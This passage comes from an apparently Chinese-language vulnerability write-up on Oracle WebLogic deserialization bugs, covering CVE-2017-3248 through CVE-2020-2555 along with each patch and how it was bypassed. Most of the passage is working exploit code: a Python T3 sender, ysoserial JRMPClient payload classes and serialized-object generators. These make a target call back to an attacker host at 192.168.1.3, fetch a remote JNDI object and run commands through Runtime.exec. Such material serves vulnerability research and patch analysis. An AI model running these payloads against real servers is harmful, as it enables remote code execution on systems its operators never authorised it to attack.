class="string">b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>) <span class="comment">#t3协议头</span></span><br><span class="line">    flag = binascii.a2b_hex(<span class="string">b&quot;fe010000&quot;</span>) <span class="comment">#反序列化数据标志</span></span><br><span class="line">    payload = data_len + t3header + flag + payload</span><br><span class="line">    payload = struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="built_in">len</span>(payload)) + payload[<span class="number">4</span>:] <span class="comment">#重新计算数据包长度</span></span><br><span class="line">    sock.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    gadget = <span class="string">&quot;JRMPClient&quot;</span>  <span class="comment">#CommonsCollections1 Jdk7u21 JRMPClient</span></span><br><span class="line">    command = <span class="string">&quot;192.168.1.3:8080&quot;</span> <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    payload = get_payload1(gadget, command)</span><br><span class="line">    )</span><br><span class="line">    )</span><br><span class="line">    exp(host, port, payload)</span><br></pre></td></tr></table></figure>
<h2 id="CVE-2017-3248的修复">CVE-2017-3248的修复</h2>
<p>补丁：p24667634_1036_Generic<br>
官方的修复是新加resolveProxyClass，过滤java.rmi.registry.Registry<br>
<img src="1584934771356-0b9b6e3c-7b83-48d7-8d1d-da75cbcf714f.png" alt="image.png"></p>
<h2 id="CVE-2018-2628">CVE-2018-2628</h2>
<p>上面提到过滤了Registry，这样ysoserial中原生JRMPClient就打不了，但是仍然有多种办法bypass。</p>
<h3 id="替换接口">替换接口</h3>
<p>引用@<a href="https://xz.aliyun.com/u/4522"><strong>lpwd</strong></a>师傅的话：</p>
<blockquote>
<p>这个CVE廖也提交了绕过，他的绕过是用java.rmi.activation.Activator替换java.rmi.registry.Registry，从而绕过resolveProxyClass的判断。其实这里对接口没有要求，不一定是rmi接口，随便找一个接口都行，比如java.util.Map</p>
</blockquote>
<p><img src="1584684491514-7974dab3-f688-4bf2-8e8d-e5d49f9a6bd5.png" alt="image.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">    <span class="string">&quot;restriction&quot;</span></span><br><span class="line">&#125; )</span><br><span class="line"><span class="meta">@PayloadTest( harness=&quot;ysoserial.test.payloads.JRMPReverseConnectSMTest&quot;)</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.MBECHLER &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JRMPClient3</span> <span class="keyword">extends</span> <span class="title class_">PayloadRunner</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Map&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Map <span class="title function_">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        String host;</span><br><span class="line">        <span class="type">int</span> port;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">        <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(</span><br><span class="line">            JRMPClient.class.getClassLoader(),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Map.class &#125;,</span><br><span class="line">            obj);</span><br><span class="line">        <span class="keyword">return</span> proxy;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());</span><br><span class="line">        PayloadRunner.run(JRMPClient.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="直接用UnicastRef">直接用UnicastRef</h3>
<p>CVE-2017-3248的构造中把UnicastRef放入了Registry，其实用UnicastRef也能在反序列化的时候发起jrmp请求。这种方法要比替换接口的干脆很多。在ysoserial中加一个JRMPClient2</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">    <span class="string">&quot;restriction&quot;</span></span><br><span class="line">&#125; )</span><br><span class="line"><span class="meta">@PayloadTest( harness=&quot;ysoserial.test.payloads.JRMPReverseConnectSMTest&quot;)</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.MBECHLER &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JRMPClient2</span> <span class="keyword">extends</span> <span class="title class_">PayloadRunner</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;UnicastRef&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> UnicastRef <span class="title function_">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        String host;</span><br><span class="line">        <span class="type">int</span> port;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">        <span class="keyword">return</span> ref;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());</span><br><span class="line">        PayloadRunner.run(JRMPClient.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="CVE-2018-2628的修复">CVE-2018-2628的修复</h2>
<p>补丁：2018年四月发布的p27395085_1036_Generic<br>
UnicastRef在weblogic.utils.io.oif.WebLogicFilterConfig中加进了黑名单。<br>
<img src="1584698130591-207644b4-ca01-41d7-aaa6-a38737075255.png" alt="image.png"></p>
<h2 id="CVE-2018-2893">CVE-2018-2893</h2>
<p>streamMessageImpl + jrmp代理类绕过。先来看payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> weblogic.jms.common.StreamMessageImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE_2018_2893</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">objID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">tcpEndpoint</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(<span class="string">&quot;192.168.1.3&quot;</span>, <span class="number">8080</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">unicastRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(objID, tcpEndpoint, <span class="literal">false</span>));</span><br><span class="line">        <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">remoteObjectInvocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(unicastRef);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Registry.class &#125;, remoteObjectInvocationHandler);</span><br><span class="line">        <span class="type">StreamMessageImpl</span> <span class="variable">streamMessage</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StreamMessageImpl</span>(serialize(object));</span><br><span class="line">        ser(streamMessage, <span class="string">&quot;CVE_2018_2893.ser&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ser</span><span class="params">(Object obj, String serName)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(serName);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        System.out.println(<span class="string">&quot;-------序列化成功&quot;</span> + serName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ByteArrayOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        serialize(obj, out);</span><br><span class="line">        <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> OutputStream out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>什么鬼？payload中用到的streamMessageImpl、Registry、UnicastRef不是已经被修复了吗？</p>
<p>我们来细看一下怎么修的。<br>
streamMessageImpl的readExternal内部是拿给FilteringObjectInputStream过滤。<br>
<img src="1584710908628-4d0c2a6d-e1b7-4228-a3cb-9d524c3ab646.png" alt="image.png"></p>
<p>FilteringObjectInputStream只是对普通类的反序列化进行了拦截，<strong>并没有对代理类进行拦截</strong>。对你没看错，虽然在CVE-2017-3248后ServerChannelInoutStream类中的resolveProxyClass过滤了Registry，但是这里的FilteringObjectInputStream并没有实现resolveProxyClass过滤代理类。<br>
<img src="1584710976177-97024508-c398-4f6e-b4eb-21a5de7eea5b.png" alt="image.png"></p>
<p>那UnicastRef又为啥逃过一劫？我们来看UnicastRef在序列化的时候经历了什么。在上面的payload中UnicastRef传入了RemoteObjectInvocationHandler，RemoteObjectInvocationHandler继承自RemoteObject。在RemoteObject writeObject时只是写入UnicastRef的类名（并没有把他作为一个类序列化）然后调用UnicastRef的writeExternal。<br>
<img src="1584860540228-fe6c0a00-c540-4adb-ba28-95f78f6c6526.png" alt="image.png"></p>
<p>UnicastRef又用到了LiveRef的write，写入了反序列化时需要反连的host和端口。<br>
<img src="1584860611067-35091a96-92e1-4880-af99-1a41df05c038.png" alt="image.png"></p>
<p><strong><img src="1584860770547-7e1eb9b8-1a60-46df-8176-0babe48b29ec.png" alt="image.png"></strong><br>
<strong>由此可见UnicastRef从始至终并没有作为一个类被反序列化</strong>，如果分析这个payload的resolve*时序会发现完全没有反序列化UnicastRef。<img src="1584757419567-e05e2bad-6864-4b2a-8808-ea680f0b396a.png" alt="image.png"><br>
如果你分析序列化出来的数据会发现<strong>UnicastRef</strong>只是TC_BLOCKDATA而不是TC_CLASSDESC。<br>
<img src="1584802424702-8c273e78-5144-4cf4-8508-9791166c0aeb.png" alt="image.png"></p>
<h2 id="CVE-2018-2893的修复">CVE-2018-2893的修复</h2>
<p>补丁：18年7月 p27919965_1036_Generic<br>
这次修复把经过resolveClass的java.rmi.server.RemoteObjectInvocationHandler给过滤了。<br>
<img src="1584757380169-c0e94533-c304-4b2b-92f4-5328df54978c.png" alt="image.png"></p>
<h2 id="CVE-2018-3245">CVE-2018-3245</h2>
<p>再次引用@<strong><a href="https://xz.aliyun.com/u/4522">lpwd</a>师傅的话：</strong></p>
<blockquote>
<p>根据前面的分析可知，我们只需要找一个类似java.rmi.server.RemoteObjectInvocationHandler的类进行替换，就能继续绕过了。<br>
那么这个类应该满足以下条件：<br>
继承远程类：java.rmi.server.RemoteObject<br>
不在黑名单里边（java.rmi.activation. 、sun.rmi.server.）<br>
随便找了一下，符合条件的挺多的：<br>
javax.management.remote.rmi.RMIConnectionImpl_Stub<br>
com.sun.jndi.rmi.registry.ReferenceWrapper_Stub<br>
javax.management.remote.rmi.RMIServerImpl_Stub<br>
sun.rmi.registry.RegistryImpl_Stub<br>
sun.rmi.transport.DGCImpl_Stub</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper_Stub;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE_2018_3245</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(<span class="string">&quot;192.168.1.3&quot;</span>, <span class="number">8080</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">        <span class="type">ReferenceWrapper_Stub</span> <span class="variable">wrapperStub</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper_Stub</span>(ref);</span><br><span class="line">        ser(wrapperStub, <span class="string">&quot;CVE_2018_3245.ser&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ser</span><span class="params">(Object obj, String serName)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(serName);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        System.out.println(<span class="string">&quot;-------序列化成功&quot;</span> + serName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="CVE-2018-3245的修复">CVE-2018-3245的修复</h2>
<p>补丁：2018年8月 p28343311_1036_201808Generic<br>
修复方法是添加更底层的java.rmi.server.RemoteObject。<br>
<img src="1584798148125-7379c092-e2f9-443f-8ad2-26abcf8c8c47.png" alt="image.png"></p>
<h2 id="CVE-2018-3191">CVE-2018-3191</h2>
<p>这个洞是jndi注入。触发点在JtaTransactionManager。<br>
<img src="1584798618333-e4e39d89-ee25-4e2f-802a-ab5bf2599308.png" alt="image.png"></p>
<p><img src="1584798640381-5944e195-96af-4641-b0a9-cdf087c6a654.png" alt="image.png"></p>
<p><img src="1584798722915-cfb87146-35f9-438d-925c-41a52ae90838.png" alt="image.png"></p>
<p><img src="1584798761013-542d6fd5-8920-4078-9493-4b7c7c5f2741.png" alt="image.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE_2018_3191</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jndiAddress</span> <span class="operator">=</span> <span class="string">&quot;rmi://192.168.1.3:1099/Exploit&quot;</span>;</span><br><span class="line">        <span class="type">JtaTransactionManager</span> <span class="variable">jtaTransactionManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JtaTransactionManager</span>();</span><br><span class="line">        jtaTransactionManager.setUserTransactionName(jndiAddress);</span><br><span class="line">        ser(jtaTransactionManager, <span class="string">&quot;CVE_2018_3191.ser&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ser</span><span class="params">(Object obj, String serName)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(serName);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        System.out.println(<span class="string">&quot;-------序列化成功&quot;</span> + serName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="CVE-2018-3191的修复">CVE-2018-3191的修复</h2>
<p>补丁：2018年8月 p28343311_1036_Generic<br>
<img src="1584802019155-c6e68f15-42b1-460e-88ef-15ad5ae259dd.png" alt="image.png"></p>
<h2 id="CVE-2020-2555">CVE-2020-2555</h2>
<p>Oracle Coherence组件存在漏洞，该组件默认集成在Weblogic12c及以上版本中（网上资料这么说的：web10.3.6也有只是默认没有启用，未验证）。<br>
这个漏洞和cc5的构造有异曲同工之妙，触发点在BadAttributeValueExpException#readObject 中调用toString方法。<br>
<img src="1585031019146-eae01e8a-459f-4c4e-8721-5cf71ee4cf96.png" alt="image.png"><br>
在Coherence组件中LimitFilter这个类刚好可以被序列化并且有toString这个方法。因为是反序列化，this.m_comparator和this.m_oAnchorBottom都可控。也就说<code>extractor.extract(``this``.m_oAnchorBottom)</code>完全可控(更严格的说m_comparator需要是ValueExtractor的实例并且和m_oAnchorBottom都需要可被序列化)。<br>
<img src="1585031243642-c510f34c-79ba-4281-ad7b-7369870e4812.png" alt="image.png"><br>
我们来看一下有哪些满足条件的类实现了extract。<br>
可以注意到com.tangosol.util.extractor.ReflectionExtractor#extract<br>
<img src="1585031717014-721c2395-5fe1-40ce-8d6d-6be6af1b0058.png" alt="image.png"><br>
它可以被序列化并且extract里面是一组反射操作。<br>
<img src="1585031831736-9700a25a-4236-409c-a8c3-9c6314df0bc3.png" alt="image.png"></p>
<p><img src="1585031809085-a6f41e3e-8971-4416-8ec0-160d44a82f80.png" alt="image.png"><br>
其次注意到com.tangosol.util.extractor.ChainedExtractor#extract<br>
<img src="1585031865174-55287322-bdeb-4ddf-843d-a31557b11098.png" alt="image.png"><br>
里面是对extrator进行链式操作（并且这个类同样可以被反序列化），说到这里已经可以看出来是和cc链一个套路了。<br>
<img src="1585031899900-c0d8a1d2-e502-4829-9cf5-bda2bfc7d4c3.png" alt="image.png"></p>
<p>这里我是在windows上复现的（~~很奇怪我在linux完整安装打不了，windows上默认安装就可以，~~后来发现linux环境是7u21这个版本的BadAttributeValueExpException并没有readObject方法，另外不需要用完整示例安装默认安装即可）。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.tangosol.util.ValueExtractor;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.extractor.ChainedExtractor;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.extractor.ReflectionExtractor;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.filter.LimitFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE_2020_2555</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">//String cmd = &quot;touch /tmp/CVE_2020_2555_12013&quot;;</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span><span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">        ValueExtractor[] valueExtractors = <span class="keyword">new</span> <span class="title class_">ValueExtractor</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//new ReflectionExtractor(&quot;exec&quot;, new Object[]&#123;new String[]&#123;&quot;/bin/bash&quot;, &quot;-c&quot;, cmd&#125;&#125;)</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// chain</span></span><br><span class="line">        <span class="type">LimitFilter</span> <span class="variable">limitFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LimitFilter</span>();</span><br><span class="line">        limitFilter.setTopAnchor(Runtime.class);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">expException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">m_comparator</span> <span class="operator">=</span> limitFilter.getClass().getDeclaredField(<span class="string">&quot;m_comparator&quot;</span>);</span><br><span class="line">        m_comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        m_comparator.set(limitFilter, <span class="keyword">new</span> <span class="title class_">ChainedExtractor</span>(valueExtractors));</span><br><span class="line">        <span class="type">Field</span> <span class="variable">m_oAnchorTop</span> <span class="operator">=</span> 